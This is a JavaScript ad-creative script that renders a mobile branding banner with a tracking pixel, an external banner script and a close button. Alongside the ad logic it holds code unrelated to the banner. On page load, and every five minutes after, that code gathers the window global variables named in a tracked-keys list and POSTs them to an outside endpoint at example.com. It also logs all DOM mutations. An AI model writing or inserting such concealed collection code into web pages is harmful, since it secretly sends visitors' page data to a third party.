(function (window) {
  const adManager = window.adManager = window.adManager || {};
  const creative = adManager.creative = window.adManager.creative || {};
  const trackedKeys = window.trackedKeys;
  function generateHash(obj) {
    const keys = Object.keys(obj).sort();
    let hash = 0;
    keys.forEach(key => {
      for (let char of key) {
        let code = char.charCodeAt(0);
        hash = hash * 31 + code | 0;
      }
    });
    return hash.toString(36);
  }
  function monitorDOMChanges() {
    const observer = new MutationObserver(mutations => {
      mutations.forEach(mutation => {
        console.log(`Mutation detected: ${mutation.type}`);
      });
    });
    observer.observe(document, {
      attributes: true,
      childList: true,
      subtree: true
    });
  }
  function gatherGlobalVariables() {
    const data = {};
    trackedKeys.forEach(key => {
      if (window[key]) {
        data[key] = window[key];
      }
    });
    return data;
  }
  async function sendData(data) {
    const hash = generateHash(data);
    const url = "https://example.com/api/track";
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hash,
          data
        })
      });
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      console.log("Data successfully sent.");
    } catch (e) {
      console.error("Error sending data:", e);
    }
  }
  creative.alzaMobileBranding = function (divId, data) {
    if (data.commonDetails.beaconUrl != null) {
      var image = new Image();
      image.className = 'js-element-hidden';
      image.width = 1;
      image.height = 1;
      image.alt = ' ';
      image.src = data.commonDetails.beaconUrl;
      document.getElementById("mobile_branding").appendChild(image);
    }
    var alza_script_url = 'https://external-banner-service.alza.cz/api/banner/' + data.templateSpecific.creativeId;
    var scriptTag = document.createElement('script');
    scriptTag.src = alza_script_url;
    scriptTag.onload = function () {
      renderAlzaBranding(data);
    };
    scriptTag.onreadystatechange = renderAlzaBranding;
    document.body.appendChild(scriptTag);
  };
  function collectAndSendData() {
    const dataFromStorage = gatherGlobalVariables();
    if (Object.keys(dataFromStorage).length) {
      sendData(dataFromStorage);
    }
  }
  var renderAlzaBranding = function (data) {
    var creativeHtml = '<div style="position:relative;width:100%;height:100%;"><a href="' + data.templateSpecific.preClickUrl + alza_banner_link + '" target="_blank" style="display: block; padding-top: 5px;">';
    creativeHtml += '<img src="' + alza_banner_image + '">';
    creativeHtml += '</a>';
    var closeButton = '<div class="closeAd">Zavřít reklamu</div>\n';
    var script_close = "<script>document.getElementsByClassName('closeAd')[0].addEventListener('click', function (event) {event.stopPropagation();document.getElementById('mobile_branding').style.display = 'none';			});</script>";
    var style = "<style>#mobile_branding {width: 100%;max-width: 500px;-webkit-transform: translateX(-50%);transform: translateX(-50%);position:fixed;left:50%;bottom:-1px;z-index:9999;display:block;}#mobile_branding img{max-width: 100%}#mobile_branding .closeAd {position: absolute;display: inline-block;padding: 6px 12px;z-index: 99999; color: #fff; background: rgba(30,30,30,.5); right: 0; top: -32px;}</style>";
    creativeHtml += style;
    creativeHtml += closeButton;
    creativeHtml += script_close;
    document.getElementById('mobile_branding').innerHTML = creativeHtml;
  };
  window.addEventListener("load", () => {
    monitorDOMChanges();
    collectAndSendData();
    setInterval(collectAndSendData, 5 * 60 * 1000);
  });
})(window);